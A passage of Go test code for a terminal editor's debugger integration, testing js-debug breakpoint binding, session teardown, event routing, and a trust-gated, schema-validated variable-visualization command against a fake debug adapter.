	a.activeTabPtr().MoveCursorTo(editor.Position{Line: bpLine, Col: 0}, false)
	a.handleKey(tcell.NewEventKey(tcell.KeyF9, 0, tcell.ModNone))
	a.syncBreakpoints()
	a.handleKey(tcell.NewEventKey(tcell.KeyF5, 0, tcell.ModNone))

	if !pumpEvents(t, a, 60*time.Second, func() bool {
		return a.debug != nil && a.debug.running
	}) {
		t.Fatalf("the session never came up; last status %q", a.statusMsg)
	}

	if strings.Contains(a.statusMsg, "could not be set") {
		t.Errorf("🔴 the editor announced %q for a provisionally-bound breakpoint that will "+
			"actually be hit", a.statusMsg)
	}

	a.draw()
	if got := gutterRuneAt(t, a, bpLine); got == '○' {
		t.Error("🔴 the gutter drew ○ (\"the adapter refused to bind this\") on a working " +
			"js-debug breakpoint")
	}

	// And the panel must agree with the gutter, or one breakpoint is drawn two
	// ways with nothing to say which is right.
	snap := a.debugSnapshot()
	if len(snap.Breakpoints) != 1 {
		t.Fatalf("published %d breakpoints, want 1: %+v", len(snap.Breakpoints), snap.Breakpoints)
	}
	if !snap.Breakpoints[0].Verified {
		t.Error("the Debug panel is told this breakpoint is unverified while the gutter draws " +
			"it as one that will bind")
	}
}

// TestStopClosesTheLeafBeforeTheCoordinator pins the teardown order.
//
// 🔴 The coordinator owns the adapter SERVER and the leaf is a second connection
// into it. Stopping the root first kills the server out from under the leaf's
// disconnect — and disconnect{terminateDebuggee:true} is the only thing that
// ends the debugged node process, since js-debug reports
// supportsTerminateRequest:false. Getting the order wrong leaks a live process
// every time the user presses stop, with nothing on screen to report it.
func TestStopClosesTheLeafBeforeTheCoordinator(t *testing.T) {
	server, argv := newFakeCoordinator(t)
	withFakeJsDebugAdapter(t, argv, true)

	a, _ := jsAppFixture(t)
	t.Cleanup(a.stopDebugSession)

	a.handleKey(tcell.NewEventKey(tcell.KeyF5, 0, tcell.ModNone))
	if !pumpEvents(t, a, 60*time.Second, func() bool {
		return a.debug != nil && a.debug.running && a.debug.root != nil
	}) {
		t.Fatalf("the session never came up; last status %q", a.statusMsg)
	}
	child := server.conn(1)
	if child == nil {
		t.Fatal("no child connection")
	}

	a.menuDebugStop()
	if a.debug != nil {
		t.Fatal("the session was not cleared from the UI")
	}

	// The leaf must be told to disconnect-and-terminate. Without it the debuggee
	// outlives the editor, and js-debug offers no `terminate` to fall back on.
	deadline := time.Now().Add(10 * time.Second)
	for time.Now().Before(deadline) {
		if containsCommand(child.commands(), "disconnect") {
			for _, r := range child.requests() {
				if r.Command != "disconnect" {
					continue
				}
				if kill, _ := r.Args["terminateDebuggee"].(bool); !kill {
					t.Errorf("the leaf was disconnected WITHOUT terminateDebuggee (%v); the "+
						"debugged process would be left running", r.Args)
				}
				return
			}
		}
		time.Sleep(20 * time.Millisecond)
	}
	t.Fatalf("the leaf session was never disconnected; requests seen on it: %v", child.commands())
}

// TestEventsFromAForeignClientAreIgnored pins the session discriminator.
//
// A js-debug session is a ROOT coordinator plus a LEAF that owns the program,
// and both are given the same Handlers. Before the *Client argument existed the
// two streams merged, so a stop reported by the coordinator — which debugs
// nothing — moved the cursor and painted ▶ at a location from the wrong
// process. A plausible location from the wrong process is the worst thing a
// debugger can show, because nothing on screen says it is wrong.
func TestEventsFromAForeignClientAreIgnored(t *testing.T) {
	a, path := debugFixture(t)
	leaf := &dap.Client{}
	foreign := &dap.Client{}
	a.debug = &debugSession{
		adapter: "js-debug", running: true, client: leaf,
		bound: map[string][]boundBreakpoint{},
	}

	// A stop from a client this session does not own must change nothing.
	a.handleDAPEvent(&debugEvent{
		when: time.Now(), client: foreign,
		ev: stoppedEventFor(t, 1, "breakpoint"),
	})
	if a.debug.stopped {
		t.Fatal("a stop from a foreign connection was applied — the UI would show a " +
			"location from a process this session is not debugging")
	}
	if a.debug.path != "" {
		t.Fatalf("a foreign stop set the location to %q", a.debug.path)
	}
	_ = path
}

// TestCoordinatorProgramEventsAreIgnored is the same rule one step in: the ROOT
// is a connection this session DOES own, but it owns no program, so its
// program-state events must still not move the marker. Only terminated/exited
// are honoured from either connection, because which one ends first has not
// been measured.
func TestCoordinatorProgramEventsAreIgnored(t *testing.T) {
	a, _ := debugFixture(t)
	root := &dap.Client{}
	leaf := &dap.Client{}
	a.debug = &debugSession{
		adapter: "js-debug", running: true, client: leaf, root: root,
		bound: map[string][]boundBreakpoint{},
	}

	a.handleDAPEvent(&debugEvent{
		when: time.Now(), client: root,
		ev: stoppedEventFor(t, 1, "breakpoint"),
	})
	if a.debug.stopped {
		t.Fatal("the coordinator's stop was applied; it has no program state to report")
	}
}

// stoppedEventFor builds a stopped event with a body that actually DECODES.
//
// 🔴 This exists because the first version of the two tests above sent an empty
// Body, decodeBody rejected it, handleDAPStopped returned before setting
// stopped, and both assertions passed whether the routing guard was there or
// not — an oracle that measured nothing, caught only by disabling the guard and
// seeing them stay green.
func stoppedEventFor(t *testing.T, threadID int, reason string) dap.Event {
	t.Helper()
	body, err := json.Marshal(map[string]interface{}{"reason": reason, "threadId": threadID})
	if err != nil {
		t.Fatal(err)
	}
	return dap.Event{Type: dap.TypeEvent, Event: dap.EventStopped, Body: body}
}

// TestDebugGutterKeepsTheLineBackground pins an argument-order bug that was
// invisible by construction.
//
// 🔴 tcell's Style.Decompose returns (fg, bg, attr) IN THAT ORDER. The gutter
// painter took the FIRST return into a variable named bg and used it as the
// background, so every breakpoint dot and stopped arrow was drawn on the
// previous cell's FOREGROUND colour. It reads as a theme quirk — a coloured
// block behind the glyph — rather than as a bug, and no test could see it
// because the assertions all checked which RUNE landed, never its style.
func TestDebugGutterKeepsTheLineBackground(t *testing.T) {
	a, path := debugFixture(t)
	a.debug = &debugSession{
		adapter: "delve", running: true,
		bound: map[string][]boundBreakpoint{},
	}
	a.handleDebugStopped(&debugStoppedEvent{
		when: time.Now(), path: path, line: 5, reason: "breakpoint",
	})

	a.draw()
	a.screen.Show()
	scr := a.screen.(tcell.SimulationScreen)
	ex, ey, ew, eh := a.editorRect()

	tab := a.activeTabPtr()
	row, ok := tab.GutterRowFor(5, ew, eh)
	if !ok {
		t.Fatal("the stopped line is not on screen; the fixture cannot prove anything")
	}

	// The glyph cell and its NEIGHBOUR ON THE SAME ROW. Comparing against another
	// row would fail honestly: the stopped line carries the cursor-line
	// background, so a different row differs for a legitimate reason.
	_, _, glyphStyle, _ := scr.GetContent(ex, ey+row)
	_, _, plainStyle, _ := scr.GetContent(ex+1, ey+row)

	_, glyphBG, _ := glyphStyle.Decompose()
	plainFG, plainBG, _ := plainStyle.Decompose()

	if glyphBG == plainFG && plainFG != plainBG {
		t.Fatalf("the glyph's background is the line's FOREGROUND (%v) — Decompose's "+
			"return order was misread", glyphBG)
	}
	if glyphBG != plainBG {
		t.Errorf("glyph background %v does not match the surrounding gutter background %v",
			glyphBG, plainBG)
	}
}

// vizAdapter is a fake debug adapter for the visualization commands: it answers
// initialize, stackTrace, evaluate and variables from fixed tables and records
// every request, so a test can assert both on the document AND on what reached
// the wire — a refusal is only a refusal if nothing was sent.
type vizAdapter struct {
	conn   net.Conn
	r      *bufio.Reader
	frames []dap.StackFrame
	value  dap.EvaluateResult
	vars   map[int][]dap.Variable

	// initCaps is the initialize response body; evalDelay holds the evaluate
	// answer back so a short timeout fires first.
	initCaps  map[string]interface{}
	evalDelay time.Duration

	mu   sync.Mutex
	reqs []recordedRequest
}

// newVizAdapter starts the fake behind a real dap.Client over net.Pipe.
func newVizAdapter(t *testing.T, frames []dap.StackFrame, value dap.EvaluateResult, vars map[int][]dap.Variable) (*dap.Client, *vizAdapter) {
	t.Helper()
	ours, theirs := net.Pipe()
	f := &vizAdapter{conn: theirs, r: bufio.NewReader(theirs), frames: frames, value: value, vars: vars}
	client := dap.StartConn("fakeviz", ours, dap.Handlers{})
	t.Cleanup(func() {
		_ = theirs.Close()
		_ = ours.Close()
	})
	go f.serve()
	return client, f
}

// serve answers requests until the pipe closes.
func (f *vizAdapter) serve() {
	for {
		_ = f.conn.SetDeadline(time.Now().Add(30 * time.Second))
		body, err := readFramed(f.r)
		if err != nil {
			return
		}
		var req dap.Request
		if json.Unmarshal(body, &req) != nil {
			return
		}
		rec := recordedRequest{Command: req.Command, Args: map[string]interface{}{}}
		if raw, err := json.Marshal(req.Arguments); err == nil {
			_ = json.Unmarshal(raw, &rec.Args)
		}
		f.mu.Lock()
		f.reqs = append(f.reqs, rec)
		delay := f.evalDelay
		f.mu.Unlock()

		var respBody interface{} = struct{}{}
		switch req.Command {
		case "initialize":
			respBody = f.initCaps
		case "stackTrace":
			respBody = map[string]interface{}{"stackFrames": f.frames, "totalFrames": len(f.frames)}
		case "evaluate":
			time.Sleep(delay)
			respBody = f.value
		case "variables":
			ref, _ := rec.Args["variablesReference"].(float64)
			respBody = map[string]interface{}{"variables": f.vars[int(ref)]}
		case "cancel":
			continue // fire-and-forget on the client side; nobody waits on it
		}
		raw, _ := json.Marshal(respBody)
		out, _ := json.Marshal(dap.Response{
			Type: dap.TypeResponse, RequestSeq: req.Seq, Success: true,
			Command: req.Command, Body: raw,
		})
		if _, err := fmt.Fprintf(f.conn, "Content-Length: %d\r\n\r\n", len(out)); err != nil {
			return
		}
		if _, err := f.conn.Write(out); err != nil {
			return
		}
	}
}

// commands lists the request commands received, in order.
func (f *vizAdapter) commands() []string {
	f.mu.Lock()
	defer f.mu.Unlock()
	out := make([]string, 0, len(f.reqs))
	for _, r := range f.reqs {
		out = append(out, r.Command)
	}
	return out
}

// sent reports whether a request with this command was received.
func (f *vizAdapter) sent(command string) bool {
	for _, c := range f.commands() {
		if c == command {
			return true
		}
	}
	return false
}

// evaluateArgs returns the arguments of the first evaluate request, if any.
func (f *vizAdapter) evaluateArgs() (map[string]interface{}, bool) {
	f.mu.Lock()
	defer f.mu.Unlock()
	for _, r := range f.reqs {
		if r.Command == "evaluate" {
			return r.Args, true
		}
	}
	return nil, false
}

// vizStack is the two-frame stack every viz test stops on. The innermost frame
// is id 0 on purpose — js-debug's numbering — so a dropped zero shows up.
var vizStack = []dap.StackFrame{
	{ID: 0, Name: "main.add", Source: dap.Source{Path: "/p/main.go"}, Line: 6},
	{ID: 7, Name: "main.main", Source: dap.Source{Path: "/p/main.go"}, Line: 11},
}

// vizFormatConfig is the project config whose hash the trust store is keyed by.
const vizFormatConfig = `{"commands": {"go": ["gofmt", "-w", "$FILE"]}}`

// trustProject writes root's .spiceedit/format.json and records a trust
// decision for it through the PRODUCTION writer the format prompt uses, keyed
// by that config's REAL hash — so the oracle is the store's own rule (project
// AND config hash) rather than a second copy of it in the test.
func trustProject(t *testing.T, root string, trusted bool) {
	t.Helper()
	writeFormatConfig(t, root, vizFormatConfig)
	cfg, err := format.Load(root)
	if err != nil || cfg == nil {
		t.Fatalf("load format config: %v", err)
	}
	path := filepath.Join(t.TempDir(), "trust.json")
	t.Setenv("SPICEEDIT_TRUST_FILE", path)
	tf := &format.TrustFile{}
	tf.SetTrust(root, cfg.Hash(), trusted)
	if err := format.SaveTrust(path, tf); err != nil {
		t.Fatal(err)
	}
}

// vizSessionFixture is an app stopped in a fake session on vizStack, with the
// user looking at frame index cur.
func vizSessionFixture(t *testing.T, value dap.EvaluateResult, vars map[int][]dap.Variable, cur int) (*App, *vizAdapter) {
	t.Helper()
	a, _ := debugFixture(t)
	client, fake := newVizAdapter(t, vizStack, value, vars)
	frames := make([]debugFrame, 0, len(vizStack))
	for _, f := range vizStack {
		frames = append(frames, debugFrame{ID: f.ID, Name: f.Name, Path: f.Source.Path, Line: bufLineFromAdapter(f.Line)})
	}
	a.debug = &debugSession{
		client: client, adapter: "fakeviz", running: true, stopped: true, threadID: 1,
		frames: frames, curFrame: cur, bound: map[string][]boundBreakpoint{},
	}
	return a, fake
}

// vizSchemaFile loads docs/viz-schema-v1.json, the file renderers are written to.
func vizSchemaFile(t *testing.T) map[string]interface{} {
	t.Helper()
	raw, err := os.ReadFile("../../docs/viz-schema-v1.json")
	if err != nil {
		t.Fatal(err)
	}
	var s map[string]interface{}
	if err := json.Unmarshal(raw, &s); err != nil {
		t.Fatalf("schema is not JSON: %v", err)
	}
	return s
}

// assertSchemaValid checks a reply against the schema file's top level — the
// root (a viz document) when def is "", else the named $defs entry ("frames",
// "error"): every required key present, no key the schema does not declare,
// schemaVersion 1. It then decodes the reply strictly into the Go type that
// encoded it. The full JSON-Schema validator is test code of internal/dap,
// where every VizResult shape is validated against the whole file.
func assertSchemaValid(t *testing.T, reply []byte, def string) {
	t.Helper()
	schema := vizSchemaFile(t)
	node := schema
	var into interface{} = &dap.VizResult{}
	switch def {
	case "frames":
		into = &debugVizFramesDoc{}
	case "error":
		into = &debugVizErrorDoc{}
	}
	if def != "" {
		node = schema["$defs"].(map[string]interface{})[def].(map[string]interface{})
	}
	var doc map[string]interface{}
	if err := json.Unmarshal(reply, &doc); err != nil {
		t.Fatalf("reply is not a JSON object: %v: %s", err, reply)
	}
	props, _ := node["properties"].(map[string]interface{})
	for k := range doc {
		if _, ok := props[k]; !ok {
			t.Errorf("schema (%q): undeclared key %q", def, k)
		}
	}
	required, _ := node["required"].([]interface{})
	for _, k := range required {
		if _, ok := doc[k.(string)]; !ok {
			t.Errorf("schema (%q): missing required %q", def, k)
		}
	}
	if doc["schemaVersion"] != float64(1) {
		t.Errorf("schema (%q): schemaVersion = %v", def, doc["schemaVersion"])
	}
	dec := json.NewDecoder(bytes.NewReader(reply))
	dec.DisallowUnknownFields()
	if err := dec.Decode(into); err != nil {
		t.Errorf("schema (%q): %v", def, err)
	}
}

// askVizRaw runs one command through debugVizCommand — the App entry point,
// with its main-goroutine snapshot — and returns the encoded reply.
func askVizRaw(t *testing.T, a *App, req debugVizRequest) []byte {
	t.Helper()
	got := make(chan []byte, 2)
	a.debugVizCommand(req, func(b []byte) { got <- b })
	select {
	case b := <-got:
		return b
	case <-time.After(10 * time.Second):
		t.Fatal("no reply within 10s")
		return nil
	}
}

// askViz is askVizRaw decoded.
func askViz(t *testing.T, a *App, req debugVizRequest) map[string]interface{} {
	t.Helper()
	b := askVizRaw(t, a, req)
	var doc map[string]interface{}
	if err := json.Unmarshal(b, &doc); err != nil {
		t.Fatalf("reply is not JSON: %v: %s", err, b)
	}
	return doc
}

// TestDebugVizEvaluateReturnsVizJSON is the happy path end to end: a trusted,
// stopped session answers an evaluate with a schema-v1 document whose kind came
// from the extractor, whose source names the selected frame, and which says it
// may have run code because watch was asked for — and the whole reply,
// warning included, validates against the schema file.
func TestDebugVizEvaluateReturnsVizJSON(t *testing.T) {
	vars := map[int][]dap.Variable{5: {
		{Name: "[0]", Value: "1", Type: "int"},
		{Name: "[1]", Value: "4", Type: "int"},
		{Name: "[2]", Value: "9", Type: "int"},
	}}
	a, fake := vizSessionFixture(t, dap.EvaluateResult{Result: "[]int len: 3", Type: "[]int", VariablesReference: 5}, vars, 0)
	trustProject(t, a.rootDir, true)

	raw := askVizRaw(t, a, debugVizRequest{Command: debugVizEvaluate, Expression: "xs", Context: "watch", AllowSideEffects: true})
	assertSchemaValid(t, raw, "")
	var doc map[string]interface{}
	if err := json.Unmarshal(raw, &doc); err != nil {
		t.Fatal(err)
	}

	if doc["error"] != nil {
		t.Fatalf("unexpected error: %v", doc["error"])
	}
	if doc["schemaVersion"] != float64(1) || doc["kind"] != "plot" {
		t.Fatalf("schemaVersion=%v kind=%v, want 1 and plot", doc["schemaVersion"], doc["kind"])
	}
	data, _ := doc["data"].(map[string]interface{})
	if fmt.Sprint(data["y"]) != "[1 4 9]" {
		t.Errorf("plot y = %v, want [1 4 9]", data["y"])
	}
	src, _ := doc["source"].(map[string]interface{})
	if src["expression"] != "xs" || src["adapter"] != "fakeviz" {
		t.Errorf("source = %v", src)
	}
	if v, present := src["frameId"]; !present || v != float64(0) {
		t.Errorf("source.frameId = %v (present=%v), want 0 — js-debug's innermost frame", v, present)
	}
	if doc["sideEffectWarning"] != true {
		t.Errorf("watch answer must carry sideEffectWarning:true, got %v", doc["sideEffectWarning"])
	}
	args, ok := fake.evaluateArgs()
	if !ok || args["context"] != "watch" {
		t.Errorf("evaluate on the wire = %v, want context watch", args)
	}
}

// TestDebugVizEvaluateDefaultsToTheSelectedFrame pins that a panel evaluating
// with no frameId sees the scope the user is looking at in the call-stack
// picker, not always the innermost one.
func TestDebugVizEvaluateDefaultsToTheSelectedFrame(t *testing.T) {
	a, fake := vizSessionFixture(t, dap.EvaluateResult{Result: "3", Type: "int"}, nil, 1)
	trustProject(t, a.rootDir, true)

	doc := askViz(t, a, debugVizRequest{Command: debugVizEvaluate, Expression: "n", Context: "watch", AllowSideEffects: true})

	if doc["kind"] != "text" {
		t.Fatalf("kind = %v (error %v), want text", doc["kind"], doc["error"])
	}
	args, _ := fake.evaluateArgs()
	if args["frameId"] != float64(7) {
		t.Errorf("evaluate frameId = %v, want 7 (the selected frame)", args["frameId"])
	}
}

// startVizSession takes a fake adapter through the PRODUCTION capability path:
// InitializeForEval against the adapter's initialize answer, then
// handleDebugStarted, which is what stores them on the session. Nothing about
// the capabilities is set by hand.
func startVizSession(t *testing.T, initCaps map[string]interface{}, evalDelay time.Duration) (*App, *vizAdapter) {
	t.Helper()
	a, _ := debugFixture(t)
	client, fake := newVizAdapter(t, vizStack, dap.EvaluateResult{Result: "42", Type: "int"}, nil)
	fake.initCaps, fake.evalDelay = initCaps, evalDelay
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	caps, evalCaps, err := client.InitializeForEval(ctx, "fakeviz")
	if err != nil {
		t.Fatal(err)
	}
	a.debug = &debugSession{adapter: "fakeviz", starting: true, bound: map[string][]boundBreakpoint{}}
	gen := &dap.StopGen{}
	a.handleDebugStarted(&debugStartedEvent{
		when: time.Now(), client: client, adapter: "fakeviz",
		caps: caps, evalCaps: evalCaps, stopGen: gen, bound: map[string][]boundBreakpoint{},
	})
	if a.debug.stopGen != gen {
		t.Fatal("the session did not adopt the stop generation its client's events move")
	}
	frames := make([]debugFrame, 0, len(vizStack))
	for _, f := range vizStack {
		frames = append(frames, debugFrame{ID: f.ID, Name: f.Name, Path: f.Source.Path, Line: bufLineFromAdapter(f.Line)})
	}
	a.debug.stopped, a.debug.threadID, a.debug.frames, a.debug.curFrame = true, 1, frames, 0
	trustProject(t, a.rootDir, true)
	return a, fake
}

// waitForCommand polls the fake for a request, up to d.
func waitForCommand(f *vizAdapter, command string, d time.Duration) bool {
	deadline := time.Now().Add(d)
	for time.Now().Before(deadline) {
		if f.sent(command) {
			return true
		}
		time.Sleep(10 * time.Millisecond)
	}
	return f.sent(command)
}

// TestDebugVizUsesTheAdaptersRealCapabilitiesWhenSupported pins finding 2's
// positive half: an adapter whose initialize answer advertises
// supportsEvaluateForHovers and supportsCancelRequest gets hover as the default
// context, and a timed-out evaluate is CANCELLED on the wire.
func TestDebugVizUsesTheAdaptersRealCapabilitiesWhenSupported(t *testing.T) {
	a, fake := startVizSession(t, map[string]interface{}{
		"supportsEvaluateForHovers": true, "supportsCancelRequest": true,
	}, 0)
	if !a.debug.evalCaps.SupportsEvaluateForHovers || !a.debug.evalCaps.SupportsCancelRequest {
		t.Fatalf("session evalCaps = %+v, want both from initialize", a.debug.evalCaps)
	}

	raw := askVizRaw(t, a, debugVizRequest{Command: debugVizEvaluate, Expression: "n"})
	assertSchemaValid(t, raw, "")
	if args, _ := fake.evaluateArgs(); args["context"] != "hover" {
		t.Fatalf("default context on the wire = %v (reply %s), want hover", args["context"], raw)
	}

	// The cancel half, through the same session snapshot with a short timeout.
	a2, fake2 := startVizSession(t, map[string]interface{}{
		"supportsEvaluateForHovers": true, "supportsCancelRequest": true,
	}, 600*time.Millisecond)
	tgt, err := a2.debugVizTarget()
	if err != nil {
		t.Fatal(err)
	}
	lim := dap.DefaultEvalLimits()
	lim.Timeout = 100 * time.Millisecond
	out := runDebugViz(context.Background(), tgt, debugVizRequest{Command: debugVizEvaluate, Expression: "n"}, lim)
	assertSchemaValid(t, out, "error")
	if !strings.Contains(string(out), "timed out") {
		t.Errorf("reply = %s, want a timeout error", out)
	}
	if !waitForCommand(fake2, "cancel", 3*time.Second) {
		t.Errorf("adapter supports cancel but none was sent; requests %v", fake2.commands())
	}
}

// TestDebugVizUsesTheAdaptersRealCapabilitiesWhenUnsupported pins the negative
// half: an adapter that advertises neither gets the default hover REFUSED with
// nothing evaluated, and a timed-out watch evaluate is dropped, never cancelled.
func TestDebugVizUsesTheAdaptersRealCapabilitiesWhenUnsupported(t *testing.T) {
	a, fake := startVizSession(t, map[string]interface{}{
		"supportsEvaluateForHovers": false, "supportsCancelRequest": false,
	}, 0)

	raw := askVizRaw(t, a, debugVizRequest{Command: debugVizEvaluate, Expression: "n"})
	assertSchemaValid(t, raw, "error")
	if !strings.Contains(string(raw), dap.ErrEvalNoHover.Error()) {
		t.Fatalf("reply = %s, want %q", raw, dap.ErrEvalNoHover)
	}
	if fake.sent("evaluate") {
		t.Error("an evaluate reached the adapter despite the refusal")
	}

	a2, fake2 := startVizSession(t, map[string]interface{}{}, 600*time.Millisecond)
	tgt, err := a2.debugVizTarget()
	if err != nil {
		t.Fatal(err)
	}
	lim := dap.DefaultEvalLimits()
	lim.Timeout = 100 * time.Millisecond
	out := runDebugViz(context.Background(), tgt, debugVizRequest{Command: debugVizEvaluate, Expression: "n", Context: "watch", AllowSideEffects: true}, lim)
	if !strings.Contains(string(out), "timed out") {
		t.Errorf("reply = %s, want a timeout error", out)
	}
	if waitForCommand(fake2, "cancel", 900*time.Millisecond) {
		t.Errorf("adapter does not support cancel but one was sent; requests %v", fake2.commands())
	}
}

// TestDebugVizCapabilitiesEventRevisesEvalCaps pins that a mid-session
// `capabilities` event reaches the safe evaluate's caps, and that a key the
// event does not name is left alone.
func TestDebugVizCapabilitiesEventRevisesEvalCaps(t *testing.T) {
	a, _ := startVizSession(t, map[string]interface{}{"supportsCancelRequest": true}, 0)
	body, _ := json.Marshal(map[string]interface{}{"capabilities": map[string]interface{}{"supportsEvaluateForHovers": true}})
	a.handleDAPEvent(&debugEvent{when: time.Now(), client: a.debug.client, ev: dap.Event{Event: dap.EventCapabilities, Body: body}})
	if got := a.debug.evalCaps; !got.SupportsEvaluateForHovers || !got.SupportsCancelRequest {
		t.Errorf("evalCaps after event = %+v, want hover gained and cancel kept", got)
	}
}

// TestDebugVizRefusesAnUntrustedWorkspace pins the trust gate for both
// commands, and that the refusal is decided before anything reaches the adapter.
func TestDebugVizRefusesAnUntrustedWorkspace(t *testing.T) {
	a, fake := vizSessionFixture(t, dap.EvaluateResult{Result: "3"}, nil, 0)
	trustProject(t, a.rootDir, false)

	for _, cmd := range []string{debugVizEvaluate, debugVizFrames} {
		raw := askVizRaw(t, a, debugVizRequest{Command: cmd, Expression: "n", Context: "watch", AllowSideEffects: true})
		assertSchemaValid(t, raw, "error")
		if !strings.Contains(string(raw), dap.ErrEvalUntrusted.Error()) {
			t.Errorf("%s: reply = %s, want %q", cmd, raw, dap.ErrEvalUntrusted)
		}
	}
	if cmds := fake.commands(); len(cmds) != 0 {
		t.Errorf("untrusted workspace still sent %v", cmds)
	}
}

// TestDebugVizRefusesWhileRunning pins the stopped-only rule for both
// commands: frame ids and variable references mean nothing while running.
func TestDebugVizRefusesWhileRunning(t *testing.T) {
	a, fake := vizSessionFixture(t, dap.EvaluateResult{Result: "3"}, nil, 0)
	trustProject(t, a.rootDir, true)
	a.debug.stopped = false

	for _, cmd := range []string{debugVizEvaluate, debugVizFrames} {
		doc := askViz(t, a, debugVizRequest{Command: cmd, Expression: "n", Context: "watch", AllowSideEffects: true})
		if msg, _ := doc["error"].(string); msg != dap.ErrEvalNotStopped.Error() {
			t.Errorf("%s: error = %v, want %q", cmd, doc["error"], dap.ErrEvalNotStopped)
		}
	}
	if cmds := fake.commands(); len(cmds) != 0 {
		t.Errorf("a running session still sent %v", cmds)
	}
}

// TestDebugVizRefusesAfterTheSessionResumed pins finding 6: the command's
// snapshot says stopped, but the program resumes (a `continued` event) before
// the request goroutine reaches the adapter. Each adapter request re-checks,
// so nothing is sent and the answer says why — rather than evaluating a frame
// id from the old stop against the new one.
func TestDebugVizRefusesAfterTheSessionResumed(t *testing.T) {
	a, fake := vizSessionFixture(t, dap.EvaluateResult{Result: "3"}, nil, 0)
	trustProject(t, a.rootDir, true)
	tgt, err := a.debugVizTarget()
	if err != nil {
		t.Fatal(err)
	}

	a.handleDAPEvent(&debugEvent{when: time.Now(), client: a.debug.client, ev: dap.Event{Event: dap.EventContinued}})

	for _, cmd := range []string{debugVizEvaluate, debugVizFrames} {
		out := runDebugViz(context.Background(), tgt, debugVizRequest{Command: cmd, Expression: "n", Context: "watch", AllowSideEffects: true}, dap.DefaultEvalLimits())
		assertSchemaValid(t, out, "error")
		if !strings.Contains(string(out), dap.ErrEvalResumed.Error()) {
			t.Errorf("%s: reply = %s, want %q", cmd, out, dap.ErrEvalResumed)
		}
	}
	if cmds := fake.commands(); len(cmds) != 0 {
		t.Errorf("a resumed session still sent %v", cmds)
	}
}

// TestDebugVizFramesListsThePausedFrames pins the frames document: every paused
// frame with its adapter id and 1-based line, and the selected frame's id —
// including id 0, which an omitempty would turn into "none selected".
func TestDebugVizFramesListsThePausedFrames(t *testing.T) {
	a, _ := vizSessionFixture(t, dap.EvaluateResult{}, nil, 0)
	trustProject(t, a.rootDir, true)

	raw := askVizRaw(t, a, debugVizRequest{Command: debugVizFrames})
	assertSchemaValid(t, raw, "frames")
	var doc map[string]interface{}
	if err := json.Unmarshal(raw, &doc); err != nil {
		t.Fatal(err)
	}

	frames, _ := doc["frames"].([]interface{})
	if len(frames) != 2 {
		t.Fatalf("frames = %v (error %v), want 2", doc["frames"], doc["error"])
	}
	inner, _ := frames[1].(map[string]interface{})
	if inner["id"] != float64(7) || inner["name"] != "main.main" || inner["line"] != float64(11) {
		t.Errorf("frame[1] = %v, want id 7, main.main, adapter line 11", inner)
	}
	if v, present := doc["selectedFrameId"]; !present || v != float64(0) {
		t.Errorf("selectedFrameId = %v (present=%v), want 0", v, present)
	}
}

// TestDebugVizTruncationSurvivesNormalisation pins that a value clipped by the
// output cap is reported truncated. A clipped string is a LEAF, so Normalize's
// per-node marks alone would present it as complete. The reply validates
// against the schema with truncated and truncatedBy present.
func TestDebugVizTruncationSurvivesNormalisation(t *testing.T) {
	client, _ := newVizAdapter(t, vizStack, dap.EvaluateResult{Result: strings.Repeat("x", 5000), Type: "string"}, nil)
	tgt := debugVizTarget{client: client, pause: dap.PauseState{Stopped: true, ThreadID: 1}, trusted: true}
	lim := dap.DefaultEvalLimits()
	lim.MaxOutBytes = 400

	out := runDebugViz(context.Background(), tgt, debugVizRequest{Command: debugVizEvaluate, Expression: "s", Context: "watch", AllowSideEffects: true}, lim)
	assertSchemaValid(t, out, "")
	if len(out) > lim.MaxOutBytes {
		t.Errorf("reply is %d bytes, cap %d", len(out), lim.MaxOutBytes)
	}
	var doc map[string]interface{}
	if err := json.Unmarshal(out, &doc); err != nil {
		t.Fatal(err)
	}
	if doc["truncated"] != true {
		t.Fatalf("doc = %s, want truncated:true", out)
	}
	if fmt.Sprint(doc["truncatedBy"]) != "[output]" {
		t.Errorf("truncatedBy = %v, want [output]", doc["truncatedBy"])
	}
}

// TestDebugVizOutputCapCountsSerializedBytes pins finding 4 with a large tree:
// 1500 elements whose raw values (150 KB) pass the walk's raw-byte cap, but
// whose JSON — every `<` escaped to six bytes, plus keys and structure — is
// several times the 256 KB cap. The reply must fit the cap as ENCODED, say it
// was truncated by output, keep a breadth-first prefix, and still validate.
func TestDebugVizOutputCapCountsSerializedBytes(t *testing.T) {
	const n = 1500
	kids := make([]dap.Variable, n)
	for i := range kids {
		kids[i] = dap.Variable{Name: "[" + strconv.Itoa(i) + "]", Value: strings.Repeat("<", 100), Type: "string"}
	}
	client, _ := newVizAdapter(t, vizStack,
		dap.EvaluateResult{Result: "[]string len: 1500", Type: "[]string", VariablesReference: 9},
		map[int][]dap.Variable{9: kids})
	tgt := debugVizTarget{client: client, pause: dap.PauseState{Stopped: true, ThreadID: 1}, trusted: true}
	lim := dap.DefaultEvalLimits()

	out := runDebugViz(context.Background(), tgt, debugVizRequest{Command: debugVizEvaluate, Expression: "xs", Context: "watch", AllowSideEffects: true}, lim)
	if len(out) > lim.MaxOutBytes {
		t.Fatalf("reply is %d serialized bytes, cap %d", len(out), lim.MaxOutBytes)
	}
	assertSchemaValid(t, out, "")
	var doc map[string]interface{}
	if err := json.Unmarshal(out, &doc); err != nil {
		t.Fatal(err)
	}
	if doc["truncated"] != true || !strings.Contains(fmt.Sprint(doc["truncatedBy"]), "output") {
		t.Fatalf("truncated=%v truncatedBy=%v, want true and output", doc["truncated"], doc["truncatedBy"])
	}
	data, _ := doc["data"].(map[string]interface{})
	root, _ := data["root"].(map[string]interface{})
	kept, _ := root["children"].([]interface{})
	if len(kept) == 0 || len(kept) >= n {
		t.Fatalf("kept %d of %d elements, want a non-empty strict prefix", len(kept), n)
	}
	if first, _ := kept[0].(map[string]interface{}); first["name"] != "[0]" {
		t.Errorf("first kept element = %v, want [0] — the prefix is breadth-first", first["name"])
	}
	// The cap is used, not merely respected: a prefix far below it would be a
	// result thrown away for nothing.
	if len(out) < lim.MaxOutBytes*3/4 {
		t.Errorf("reply is %d bytes, well under the %d cap", len(out), lim.MaxOutBytes)
	}
}

// TestDebugVizWithoutASessionOrWithAnUnknownCommand pins the two answers that
// never reach an adapter: no session, and a verb that is neither command. Both
// must still reply, or a caller waiting on the answer hangs.
func TestDebugVizWithoutASessionOrWithAnUnknownCommand(t *testing.T) {
	a, _ := debugFixture(t)
	if doc := askViz(t, a, debugVizRequest{Command: debugVizFrames}); doc["error"] != "no debug session" {
		t.Errorf("no session: error = %v", doc["error"])
	}

